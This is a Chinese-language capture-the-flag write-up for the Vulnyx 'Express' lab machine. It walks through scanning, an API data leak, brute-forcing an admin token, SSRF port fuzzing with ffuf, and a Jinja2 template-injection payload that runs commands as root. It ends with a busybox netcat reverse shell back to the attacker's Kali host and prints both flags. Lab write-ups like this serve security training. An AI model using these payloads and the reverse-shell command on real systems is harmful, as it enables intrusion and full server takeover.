---
title: Vulnyx-Express
published: 2025-03-09 16:18:04
tags: [Vulnyx]
category: 靶机
draft: false
---

# Express

> Difficulty: **Medium**
> 

## 前期踩点

`36`是靶机

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 08:02 EST
Nmap scan report for 192.168.56.1
Host is up (0.00031s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00027s latency).
MAC Address: 08:00:27:D5:61:82 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.35
Host is up (0.00040s latency).
MAC Address: 08:00:27:E5:B6:EC (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.36
Host is up (0.00061s latency).
MAC Address: 08:00:27:36:C4:D6 (Oracle VirtualBox virtual NIC)
```

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sT -min-rate 10000 -p- 192.168.56.36 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 08:06 EST
Nmap scan report for 192.168.56.36
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:36:C4:D6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.87 secon
```

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p 22,80 192.168.56.36 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 08:07 EST
Nmap scan report for 192.168.56.36
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:36:C4:D6 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.56.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

```
⚡ root@kali  ~/Desktop/test/test  nmap -script=vuln -p 80,22 192.168.56.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 08:09 EST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.36
Host is up (0.00057s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:36:C4:D6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 61.78 seconds
```

没扫描出扫描漏洞，优先级`80`>`22`

访问`HTTP`服务，并检测指纹，默认页面

![image.png](image%2016.png)

没信息，先扫描一下目录，耶？也没什么信息耶

```python
⚡ root@kali  ~/Desktop/test/test  gobuster dir -u 192.168.56.36 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502 --no-error -x zip,txt,html,php,asp  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.36
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403,502
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,zip,txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.36/javascript/]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

一点信息没有，最后得知作者并没有提示我们域名，但是可以在`vulnyx`的规则上找到https://vulnyx.com/rules/ ，那么域名应该就是`express.nyx`

![image.png](image%2017.png)

添加到`hosts` ，再次访问就可以访问到了 。PS：wow~还带霉霉玩

![image.png](image%2018.png)

那么目录扫描和漏洞扫描都要重新来过了

两个`javascript`文件夹 不对劲

```
⚡ root@kali  ~/Desktop/test/express  dirsearch -u http://express.nyx -x 403,404 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions:php, zip, txt |HTTP method:GET |Threads:25 |Wordlist size:10439

Output File: /root/Desktop/test/express/reports/http_express.nyx/_25-02-21_09-02-50.txt

Target:http://express.nyx/

[09:02:50] Starting:
[09:03:14] 301 -  308B  - /css  ->  http://express.nyx/css/
[09:03:24] 301 -  315B  - /javascript  ->  http://express.nyx/javascript/
[09:03:25] 301 -  307B  - /js  ->  http://express.nyx/js/

Task Completed
```

```
 root@kali  ~/Desktop/test/test  nmap -script=vuln -p 80 http://express.nyx
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 09:03 EST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Unable to split netmask from target expression: "http://express.nyx"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 34.34 seconds
```

## API 接口 信息泄露

存在两个`javascript`文件夹，我们观察一下加载的`javascript` 文件

![image.png](image%2019.png)

其中`api.js` 出现很多的接口

```jsx
function getMusicList() {
    fetch('/api/music/list')
        .then(response => response.json())
        .then(data => {
            console.log('Music genre list:', data);
        })
        .catch(error => {
            console.error('Error fetching the music list:', error);
        });
}

function getMusicSongs() {
    fetch('/api/music/songs')
        .then(response => response.json())
        .then(data => {
            console.log('List of songs:', data);
        })
        .catch(error => {
            console.error('Error fetching the list of songs:', error);
        });
}

function getUsersWithKey() {
    fetch(`/api/users?key=${secretKey}`)
        .then(response => response.json())
        .then(data => {
            console.log('User list (with key):', data);
        })
        .catch(error => {
            console.error('Error fetching the user list:', error);
        });
}

function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('URL status:', data);
    })
    .catch(error => {
        console.error('Error checking the URL availability:', error);
    });
	}
```

需要利用的可能是

```jsx
function getUsersWithKey() {
    fetch(`/api/users?key=${secretKey}`)
        .then(response => response.json())
        .then(data => {
            console.log('User list (with key):', data);
        })
        .catch(error => {
            console.error('Error fetching the user list:', error);
        });
}

function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('URL status:', data);
    })
    .catch(error => {
        console.error('Error checking the URL availability:', error);
    });
	}
```

我们在`Kali`开启简易服务器，测试了`/api/admin/availability` 后发现需要`token` 

![image.png](image%2020.png)

那么`/api/users?key=` 得需要进行模糊测试，但是进行了一段时间的模糊测试后，没测试出来数据

![image.png](image%2021.png)

将其改为`POST`后，就能拿到数据了…

泄露的接口上默认没写方法，但是没写默认一般就是`GET`

![image.png](image%2022.png)

在拿到的数据最底下能看到有一个用户有两个职能

```jsx
  {
    "id": 20,
    "roles": [
      "editor",
      "viewer"
    ],
    "token": "9527-1657-3459-4068",
    "username": "KerryCa"
  }
```

我们使用它的`token`来请求`/api/admin/availability` 接口，但还是报错了

![image.png](image%2023.png)

将`Json`数据进行处理，然后爆破，最后`4493-3179-0912-0597` 是`200`状态码的

![image.png](image%2024.png)

## SSRF

再次调用`/api/admin/availability` 接口，成功回显数据

![image.png](image%2025.png)

`kali`开启监听

```jsx
⚡ root@kali  ~/Desktop/test/test  nc -lvp 1234
listening on [any] 1234 ...
```

让服务器访问`kali` ，能构造`SSRF`

```jsx
⚡ root@kali  ~/Desktop/test/test  nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.36] 53416
GET / HTTP/1.1
Host: 192.168.56.4:1234
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

因为靶机只有一台机器，所以不会使用`SSRF`去探测内网机器，但是我可以利用他探测内网端口

生成`10000`端口字典

```jsx
root@kali  ~/Desktop/test/test  seq 10000 > ports.txt
```

使用`fuff`来模糊测试，发现内网存在`5000`端口和`9000`端口

```jsx
⚡ root@kali  ~/Desktop/test/test  ffuf -H "Content-Type: application/json" -X POST -d '{ "id":1,"url":"http://127.0.0.1:FUZZ","token":"4493-3179-0912-0597" }' -u http://express.nyx/api/admin/availability -w ports.txt -fw 36

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://express.nyx/api/admin/availability
 :: Wordlist         : FUZZ: /root/Desktop/test/test/ports.txt
 :: Header           : Content-Type: application/json
 :: Data             : { "id":1,"url":"http://127.0.0.1:FUZZ","token":"4493-3179-0912-0597" }
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 36
________________________________________________

22                      [Status: 200, Size: 175, Words: 16, Lines: 7, Duration: 96ms]
80                      [Status: 200, Size: 11239, Words: 3439, Lines: 7, Duration: 4036ms]
5000                    [Status: 200, Size: 300, Words: 39, Lines: 7, Duration: 378ms]
9000                    [Status: 200, Size: 279, Words: 50, Lines: 7, Duration: 160ms]
:: Progress: [10000/10000] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

构造访问这俩端口

`5000`端口

![image.png](image%2026.png)

`9000`端口

![image.png](image%2027.png)

```jsx
<form method="get" action="/username">
    <input type="text" name="name" placeholder="Enter your name">
    <input type="submit" value="Greet">
</form>
```

`9000`端口可以继续构造，`username`随便输入点

![image.png](image%2028.png)

可以成功回显，尝试模板注入，成功

![image.png](image%2029.png)

## SSTI

判断注入类型 https://blog.csdn.net/Manuffer/article/details/120739989

```jsx
http://127.0.0.1:9000/username?name={{7*'7'}}
// ouput
Hello, 7777777!
```

那么就是`jinja2`和`Twig`了。构造`payload` 

```jsx
http://127.0.0.1:9000/username?name={{self.__class__}}
// output
Hello, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;!
```

可以确定是`jinja2` ，构造可执行语句

```jsx
http://127.0.0.1:9000/username?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
// output
Hello, uid=0(root) gid=0(root) groups=0(root)\n!
```

构造反弹`shell` ，同时`kali`开启监听，获得`shell`

```jsx
http://127.0.0.1:9000/username?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.56.4 1234 -e /bin/bash').read()}}
// output
⚡ root@kali  ~/Desktop/Tools/SSTImap  nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.36] 58096
id
uid=0(root) gid=0(root) groups=0(root)
```

## RootFlag & UserFlag

我以为还需要搞提权的，但是直接就是`root`了

```jsx
cat r00t.txt
17a0c0830e9c71623d17b30f5a2fc40a
```

```jsx
cat user.txt
969dadb2e8f4aadb8291a496e6c75b35
```